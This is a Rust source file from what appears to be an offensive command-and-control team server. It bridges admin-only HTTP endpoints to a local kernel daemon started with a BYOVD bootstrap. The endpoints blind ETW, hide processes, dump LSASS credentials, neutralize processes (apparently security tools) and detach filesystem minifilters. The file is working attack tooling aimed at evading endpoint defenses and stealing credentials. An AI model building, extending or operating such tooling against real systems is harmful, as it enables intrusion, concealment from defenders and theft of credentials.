//! Kernel daemon bridge — forwards TUI kernel commands to the local
//! `nyx-kernel --serve <port>` daemon via TCP JSON-line protocol.
//!
//! The daemon must be started separately on the team-server host:
//!   nyx-kernel bootstrap [--byovd ...] && nyx-kernel --serve 9876

use axum::{
    extract::{Query, State},
    http::HeaderMap,
    response::{IntoResponse, Response},
    Json,
};
use serde::Deserialize;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;

use crate::operators;

/// Kernel daemon config.
pub struct KernelConfig {
    pub addr: String,
}

impl Default for KernelConfig {
    fn default() -> Self {
        Self {
            addr: std::env::var("NYX_KERNEL_DAEMON").unwrap_or_else(|_| "127.0.0.1:9876".into()),
        }
    }
}

/// Cached TCP connection to the kernel daemon.
pub struct KernelBridge {
    addr: String,
    conn: tokio::sync::Mutex<Option<TcpStream>>,
}

impl KernelBridge {
    pub fn new(config: KernelConfig) -> Self {
        Self {
            addr: config.addr,
            conn: tokio::sync::Mutex::new(None),
        }
    }

    pub fn is_configured(&self) -> bool {
        !self.addr.is_empty()
    }

    async fn send_op(&self, op: &str, pid: Option<u32>) -> Result<serde_json::Value, String> {
        let request = if let Some(p) = pid {
            format!("{{\"op\":\"{op}\",\"pid\":{p}}}\n")
        } else {
            format!("{{\"op\":\"{op}\"}}\n")
        };

        let mut guard = self.conn.lock().await;
        if guard.is_none() {
            let s = TcpStream::connect(&self.addr)
                .await
                .map_err(|e| format!("daemon {}: {e}", self.addr))?;
            *guard = Some(s);
        }
        let stream = guard.as_mut().unwrap();
        stream
            .write_all(request.as_bytes())
            .await
            .map_err(|e| format!("write: {e}"))?;

        let mut reader = BufReader::new(&mut *stream);
        let mut line = String::new();
        reader
            .read_line(&mut line)
            .await
            .map_err(|e| format!("read: {e}"))?;
        if line.is_empty() {
            *guard = None;
            return Err("daemon closed".into());
        }
        serde_json::from_str(&line).map_err(|e| format!("parse: {e}"))
    }
}

// ---- Auth helper ----
fn gate(
    st: &crate::AppState,
    headers: &HeaderMap,
) -> Result<operators::OperatorIdentity, (axum::http::StatusCode, &'static str)> {
    match crate::authenticate(st, headers) {
        crate::AuthOutcome::Allowed(op) => {
            if op.role != operators::Role::Admin {
                return Err((axum::http::StatusCode::FORBIDDEN, "admin required"));
            }
            Ok(op)
        }
        crate::AuthOutcome::Denied(_) => {
            Err((axum::http::StatusCode::UNAUTHORIZED, "auth required"))
        }
    }
}

// ---- Query params ----
#[derive(Deserialize)]
pub struct PidQ {
    pub pid: u32,
}
#[derive(Deserialize)]
pub struct NeutQ {
    pub pid: u32,
    pub method: Option<String>,
}

// ---- Handler dispatch helper ----
/// Shared kernel dispatch: gate → audit → resolve bridge.
/// Returns the bridge on success, or an error `Response` to return early.
async fn kernel_dispatch<'a>(
    st: &'a std::sync::Arc<crate::AppState>,
    headers: &HeaderMap,
    audit_action: &str,
    audit_details: &str,
    audit_data: serde_json::Value,
) -> Result<&'a std::sync::Arc<KernelBridge>, Response> {
    let op = match gate(st, headers) {
        Ok(o) => o,
        Err((code, msg)) => return Err((code, msg).into_response()),
    };
    if let Some(audit) = &st.audit {
        audit.append(audit_action, &op.name, audit_details, audit_data);
    }
    match &st.kernel {
        Some(b) => Ok(b),
        None => Err(Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response()),
    }
}

// ---- Handlers ----

pub async fn driver_status(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
) -> Response {
    let bridge = match kernel_dispatch(
        &st,
        &headers,
        "kernel_driver_status",
        "-",
        serde_json::json!({}),
    )
    .await
    {
        Ok(b) => b,
        Err(r) => return r,
    };
    match bridge.send_op("ping", None).await {
        Ok(_) => Json(serde_json::json!({"ok":true,"status":"connected"})).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"status":"error","err":e})).into_response(),
    }
}

pub async fn blind_etw(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
) -> Response {
    let bridge = match kernel_dispatch(
        &st,
        &headers,
        "kernel_blind_etw",
        "-",
        serde_json::json!({}),
    )
    .await
    {
        Ok(b) => b,
        Err(r) => return r,
    };
    match bridge.send_op("blind-etw", None).await {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn hide(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
    Query(q): Query<PidQ>,
) -> Response {
    let details = format!("pid:{}", q.pid);
    let bridge = match kernel_dispatch(
        &st,
        &headers,
        "kernel_hide",
        &details,
        serde_json::json!({}),
    )
    .await
    {
        Ok(b) => b,
        Err(r) => return r,
    };
    match bridge.send_op("hide", Some(q.pid)).await {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn dump_lsass(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
    Query(q): Query<PidQ>,
) -> Response {
    let details = format!("pid:{}", q.pid);
    let bridge = match kernel_dispatch(
        &st,
        &headers,
        "kernel_dump_lsass",
        &details,
        serde_json::json!({}),
    )
    .await
    {
        Ok(b) => b,
        Err(r) => return r,
    };
    match bridge.send_op("dump-lsass", Some(q.pid)).await {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn neutralize(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
    Query(q): Query<NeutQ>,
) -> Response {
    let details = format!("pid:{}", q.pid);
    let bridge = match kernel_dispatch(
        &st,
        &headers,
        "kernel_neutralize",
        &details,
        serde_json::json!({ "method": q.method }),
    )
    .await
    {
        Ok(b) => b,
        Err(r) => return r,
    };
    match bridge.send_op("neutralize", Some(q.pid)).await {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn detach_minifilter(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
) -> Response {
    let bridge = match kernel_dispatch(
        &st,
        &headers,
        "kernel_detach_minifilter",
        "-",
        serde_json::json!({}),
    )
    .await
    {
        Ok(b) => b,
        Err(r) => return r,
    };
    match bridge.send_op("detach-minifilter", None).await {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}
